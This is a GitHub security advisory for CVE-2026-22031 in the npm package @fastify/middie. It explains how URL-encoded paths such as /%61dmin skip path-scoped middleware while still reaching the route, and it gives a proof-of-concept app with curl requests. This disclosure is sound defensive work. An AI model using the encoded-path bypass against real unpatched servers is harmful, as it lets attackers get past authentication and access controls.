# [H] Fastify Middie Middleware Path Bypass

## Summary
Severity: High
Advisory: GHSA-cxrg-g7r8-w69p
CVE: CVE-2026-22031
CWE: CWE-177
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:L (CVSS_V3)
Published: 2026-01-20
Source: https://github.com/advisories/GHSA-cxrg-g7r8-w69p
Type: github-advisory

## Affected
- npm: `@fastify/middie` — affected >=0 <9.1.0

## Details
### Summary
A security vulnerability exists in `@fastify/middie` where middleware registered with a specific path prefix can be bypassed using URL-encoded characters (e.g., `/%61dmin` instead of `/admin`). While the middleware engine fails to match the encoded path and skips execution, the underlying Fastify router correctly decodes the path and matches the route handler, allowing attackers to access protected endpoints without the middleware constraints.

### Details
The vulnerability is caused by how `middie` matches requests against registered middleware paths.

1.  **Regex Generation**: When [fastify.use('/admin', ...)](cci:1://file:///Users/harshjaiswal/work/research/nest/packages/platform-fastify/adapters/fastify-adapter.ts:733:2-741:3) is called, `middie` uses `path-to-regexp` to generate a regular expression for the path `/admin`.
2.  **Request Matching**: For every request, `middie` executes this regular expression against `req.url` (or `req.originalUrl`).
3.  **The Flaw**: `req.url` in Fastify contains the **raw, undecoded** path string.
    *   The generated regex expects a decoded path (e.g., `/admin`).
    *   If a request is sent to `/%61dmin`, the regex comparison fails (`/^\/admin/` does not match `/%61dmin`).
    *   `middie` assumes the middleware does not apply and calls `next()`.
4.  **Route Execution**: The request proceeds to Fastify's internal router, which performs URL decoding. It correctly identifies `/%61dmin` as `/admin` and executes the corresponding route handler.

**Incriminated Source Code:**
In the provided `middie` source:
```javascript
// ... inside Holder function
if (regexp) {
  const result = regexp.exec(url) // <--- 'url' is undecoded.
  if (result) {
    // ... executes middleware ...
  } else {
    that.done() // <--- Middleware skipped on mismatch
  }
}
```

### PoC
**Step 1:** Run the following Fastify application (save as `app.js`):
```javascript
const fastify = require('fastify')({ logger: true });

async function start() {
  // Register middie for Express-style middleware support
  await fastify.register(require('@fastify/middie'));

  // Middleware to block /admin route
  fastify.use('/admin', (req, res, next) => {
    res.statusCode = 403;
    res.end('Forbidden: Access to /admin is blocked');
  });

  // Sample routes
  fastify.get('/', async (request, reply) => {
    return { message: 'Welcome to the homepage' };
  });

  fastify.get('/admin', async (request, reply) => {
    return { message: 'Admin panel' };
  });

  // Start server
  try {
    await fastify.listen({ port: 3008 });
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
}

start();
```

**Step 2:** Execute the attack.
1.  **Normal Request (Blocked):**
    ```bash
    curl http://localhost:3008/admin
    # Output: Forbidden: Access to /admin is blocked
    ```
2.  **Bypass Request (Successful):**
    ```bash
    curl http://localhost:3008/%61dmin
    # Output: {"message":"Admin panel"}
    ```

### Impact
*   **Type:** Authentication/Authorization Bypass.
*   **Affected Components:** Applications using `@fastify/middie` to apply security controls (auth, rate limiting, IP filtering) to specific route prefixes.
*   **Severity:** High. Attackers can trivially bypass critical security middleware to access protected administrative or sensitive endpoints.

## References
- https://github.com/fastify/middie/security/advisories/GHSA-cxrg-g7r8-w69p
- https://nvd.nist.gov/vuln/detail/CVE-2026-22031
- https://github.com/fastify/middie/pull/245
- https://github.com/fastify/middie/commit/d44cd56eb724490babf7b452fdbbdd37ea2effba
- https://github.com/fastify/middie
- https://github.com/fastify/middie/releases/tag/v9.1.0
